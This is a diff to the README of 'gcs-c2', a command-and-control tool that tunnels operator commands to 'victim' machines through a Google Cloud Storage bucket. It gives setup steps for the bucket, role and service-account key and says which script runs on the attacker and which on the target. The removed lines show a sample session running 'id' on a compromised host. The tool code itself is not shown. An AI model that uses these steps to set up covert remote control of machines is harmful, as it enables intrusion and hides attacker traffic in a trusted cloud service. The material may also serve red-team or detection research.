@@ -1,8 +1,34 @@
 # gcs-c2
 C2 over google cloud storage buckets
 
+![Demo](resources/demo.gif)
+
 ## Usage
-Once you have populated service account credentials and a bucket with read/write access, run the `server`, THEN the `client`
+
+### Requirements
+Ensure that the following package is installed on both the victim and attacker:
+```
+$ pip install google-cloud-storage
+```
+
+Packages specific to the server:
+```
+$ pip install tabulate colorama
+```
+
+### Creating the infrastructure:
+1. Create a private `bucket`
+2. Create a new `role` that has the following permissions
+    - `storage.buckets.get `	 	
+    - `storage.objects.create` 	 	
+    - `storage.objects.delete` 	 	
+    - `storage.objects.get` 	 	
+    - `storage.objects.list`
+3. Create a new `service account` that has the new role
+4. Create a new `key` for the service account and export it as JSON
+5. Copy the JSON contents into the `info` variable inside the `client.py` and `server.py`
+
+Once you have populated service account credentials and a bucket with read/write access, run `server.py` and `client.py` in any order. 
 
 On the attacker:
 ```
@@ -14,17 +40,4 @@ On the target:
 $ python3 client.py
 ```
 
-Once both are up:
-```
-GCP Shell> list_agents
-New agent registered: 263c81c7-fe3a-47ee-8a7b-5898218a77be
-Agent: 263c81c7-fe3a-47ee-8a7b-5898218a77be, Status: active
-GCP Shell> send_task 263c81c7-fe3a-47ee-8a7b-5898218a77be id
-Sent task to agent 263c81c7-fe3a-47ee-8a7b-5898218a77be
-GCP Shell> get_responses 263c81c7-fe3a-47ee-8a7b-5898218a77be
-Response from 263c81c7-fe3a-47ee-8a7b-5898218a77be: Command: id
-Exit code: 0
-Stdout: uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),134(wireshark),135(kismet),998(docker)
-
-GCP Shell>
-```
+Once both are up, use the `help` menu for a list of available commands.
